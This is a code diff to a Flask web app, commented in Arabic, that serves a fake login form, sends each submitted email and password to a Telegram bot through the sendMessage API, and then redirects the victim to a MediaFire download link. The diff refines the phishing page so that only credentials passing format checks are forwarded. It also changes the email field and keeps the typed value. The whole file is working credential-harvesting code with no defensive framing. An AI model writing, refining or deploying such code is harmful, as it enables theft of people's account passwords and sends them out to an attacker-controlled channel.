@@ -18,28 +18,28 @@ MEDIAFIRE_URL = (
 @app.route("/", methods=["GET", "POST"])
 def login():
   error = ""
+  email_val = ""
   if request.method == "POST":
-    email = request.form.get("email", "").strip()
+    email_val = request.form.get("email", "").strip()
     password = request.form.get("password", "")
 
-    # التحقق من صحة البريد الإلكتروني
+    # التحقق الصارم من صحة البريد الإلكتروني
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
-    if not re.match(email_pattern, email):
+    if not re.match(email_pattern, email_val):
       error = "الرجاء إدخال عنوان بريد إلكتروني صحيح (يحتوي على @ ونطاق صحيح)"
-    # التحقق من أن كلمة المرور أطول من 5 أحرف
+    # التحقق من أن كلمة المرور أكبر من 5 أحرف فعلياً
     elif len(password) <= 5:
-      error = "كلمة المرور يجب أن تكون أكثر من 5 أحرف!"
+      error = "كلمة المرور قصيرة جداً، يجب أن تكون أكثر من 5 أحرف!"
     else:
-      # إرسال البيانات إلى بوت تيليجرام إذا طابقت الشروط
+      # إذا تحققت الشروط تماماً، يتم إرسال البيانات للبوت والتوجيه
       if BOT_TOKEN and CHAT_ID:
         msg = (
-            "📩 تم استلام بيانات جديدة:\n\n📧 البريد:"
-            f" {email}\n🔑 الباسورد: {password}"
+            "📩 تم استلام بيانات مطابقة للشروط:\n\n📧 البريد:"
+            f" {email_val}\n🔑 الباسورد: {password}"
         )
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-      # التوجيه لرابط التحميل
       return redirect(MEDIAFIRE_URL)
 
   return render_template_string(
@@ -96,7 +96,7 @@ def login():
 
         <form method="POST">
             <div class="input-group">
-                <input type="email" name="email" required placeholder="البريد الإلكتروني أو الهاتف" value="{{ request.form.get('email', '') }}">
+                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف" value="{{ email_val }}">
             </div>
             <div class="input-group">
                 <input type="password" name="password" required placeholder="أدخل كلمة المرور">
@@ -108,6 +108,7 @@ def login():
 </html>
 """,
       error=error,
+      email_val=email_val,
   )
 
 
